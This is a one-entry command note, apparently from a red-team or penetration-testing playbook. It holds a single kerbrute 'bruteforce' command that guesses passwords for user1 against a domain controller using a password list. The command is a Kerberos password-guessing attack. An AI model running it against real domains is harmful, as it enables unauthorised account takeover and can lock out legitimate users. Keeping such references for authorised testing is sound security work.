---
id: ac15dde6-ed43-4283-bbaa-6a56090ce878
name: Enumerate passwords
type: command
executor: bash
data: kerbrute bruteforce --dc CONTROLLER.local -d CONTROLLER.local user1 /path/to/passwordlist.txt
output: null
created_at: '2023-04-06T03:56:04.223770+00:00'
updated_at: '2023-04-10T20:26:23.736913+00:00'
---

# Enumerate passwords

```bash
kerbrute bruteforce --dc CONTROLLER.local -d CONTROLLER.local user1 /path/to/passwordlist.txt
```


